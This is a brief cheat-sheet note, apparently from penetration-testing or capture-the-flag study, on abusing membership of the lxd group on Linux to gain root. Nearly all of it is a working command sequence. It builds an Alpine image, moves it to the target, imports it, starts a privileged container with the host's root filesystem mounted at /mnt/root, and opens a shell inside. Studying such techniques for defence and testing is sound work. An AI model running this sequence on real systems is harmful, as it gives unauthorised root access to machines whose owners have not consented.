check with id if user is in lxd group

lxc or lxd is lightweight virtualization/container like docker.
So like docker it can be used to escalate privilege to root by mounting the root filesystem


```bash
### clone lightweight linux image(alpine)
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

#transfer the tar to the target
#with any method(scp, netcat, http server)

### import the image to lxc
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage

lxc image list

###set the privilege and mount root
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

### start and check the id
lxc start ignite
lxc exec ignite /bin/sh
id
```